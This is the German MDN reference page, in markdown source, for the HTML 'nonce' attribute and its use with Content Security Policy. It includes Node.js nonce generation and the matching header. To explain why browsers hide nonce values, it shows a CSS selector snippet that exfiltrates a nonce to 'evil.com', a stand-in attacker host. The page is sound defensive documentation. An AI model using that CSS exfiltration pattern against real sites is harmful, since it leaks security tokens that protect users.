---
title: nonce
slug: Web/HTML/Reference/Global_attributes/nonce
l10n:
  sourceCommit: e9b6cd1b7fa8612257b72b2a85a96dd7d45c0200
---

{{HTMLSidebar("Global_attributes")}}

Das **`nonce`** [globale Attribut](/de/docs/Web/HTML/Reference/Global_attributes)
ist ein Inhaltsattribut, das eine kryptografische Nonce ("number used once") definiert, die von der
[Content Security Policy](/de/docs/Web/HTTP/Guides/CSP) verwendet werden kann, um zu bestimmen, ob ein bestimmter Abruf
für ein bestimmtes Element fortgesetzt werden darf.

## Beschreibung

Das `nonce`-Attribut ist nützlich, um bestimmte Elemente, wie z.B. bestimmte Inline-Skript- oder Stilelemente, auf die Positivliste zu setzen.
Es kann Ihnen helfen, die Verwendung der [CSP](/de/docs/Web/HTTP/Guides/CSP) `unsafe-inline` Direktive zu vermeiden, die _alle_ Inline-Skripte oder -Stile auf die Positivliste setzen würde.

> [!NOTE]
> Verwenden Sie `nonce` nur in Fällen, in denen Sie keine andere Möglichkeit haben, unsichere Inline-Skript- oder Stilinhalte zu verwenden. Wenn Sie `nonce` nicht benötigen, verwenden Sie es nicht. Wenn Ihr Skript statisch ist, könnten Sie stattdessen einen CSP-Hash verwenden.
> (Siehe Nutzungshinweise zu [unsafe inline script](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#unsafe_inline_script).)
> Versuchen Sie immer, den vollen Vorteil der [CSP](/de/docs/Web/HTTP/Guides/CSP) Schutzmaßnahmen zu nutzen und vermeiden Sie Nonces oder unsichere Inline-Skripte wann immer möglich.

### Verwenden von nonce, um ein `<script>`-Element auf die Positivliste zu setzen

Es gibt einige Schritte, die erforderlich sind, um ein Inline-Skript mit dem Nonce-Mechanismus auf die Positivliste zu setzen:

#### Generierung von Werten

Generieren Sie von Ihrem Webserver aus einen zufällig Base64-codierten String von mindestens 128 Bit Daten aus einem kryptografisch sicheren
Zufallszahlengenerator. Nonces sollten bei jedem Laden der Seite unterschiedlich generiert werden (Nonce nur einmal!). Zum Beispiel in nodejs:

```js
const crypto = require("crypto");
crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### Positivliste für Inline-Skript

Die auf Ihrem Backend-Code generierte Nonce sollte nun für das Inline-Skript verwendet werden, das Sie auf die Positivliste setzen möchten:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### Senden einer Nonce mit einem CSP-Header

Schließlich müssen Sie den Nonce-Wert in einem
[`Content-Security-Policy`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy)-Header senden
(vorangestellt mit `nonce-`):

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### Zugriff auf Nonces und Verbergen von Nonces

Aus Sicherheitsgründen wird das `nonce` Inhaltsattribut verborgen (ein leerer String wird zurückgegeben).

```js example-bad
script.getAttribute("nonce"); // returns empty string
```

Die [`nonce`](/de/docs/Web/API/HTMLElement/nonce) Eigenschaft ist der einzige Weg, um auf Nonces zuzugreifen:

```js example-good
script.nonce; // returns nonce value
```

Das Verbergen von Nonces hilft, Angreifer daran zu hindern, Nonce-Daten über Mechanismen zu exfiltrieren, die Daten
aus Inhaltsattributen wie diesem erfassen können:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`HTMLElement.nonce`](/de/docs/Web/API/HTMLElement/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP)
- CSP: [`script-src`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)
